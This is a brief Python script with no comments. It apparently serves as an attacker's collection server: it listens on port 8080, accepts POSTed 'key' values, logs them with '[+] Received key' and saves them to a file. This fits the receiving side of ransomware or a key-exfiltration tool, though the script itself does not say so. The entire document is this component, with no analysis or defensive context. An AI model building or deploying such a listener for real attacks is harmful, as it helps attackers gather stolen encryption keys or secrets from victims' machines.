from http.server import BaseHTTPRequestHandler, HTTPServer
import urllib.parse

class Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(length)
        data = urllib.parse.parse_qs(post_data.decode())

     
        key = data.get("key", [""])[0]
        print("[+] Received key:", key)


        with open("received_key.key", "w") as f:
            f.write(key)

        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"OK")

if __name__ == "__main__":
    server = HTTPServer(("0.0.0.0", 8080), Handler)
    print("[*] Listening on port 8080...")
    server.serve_forever()

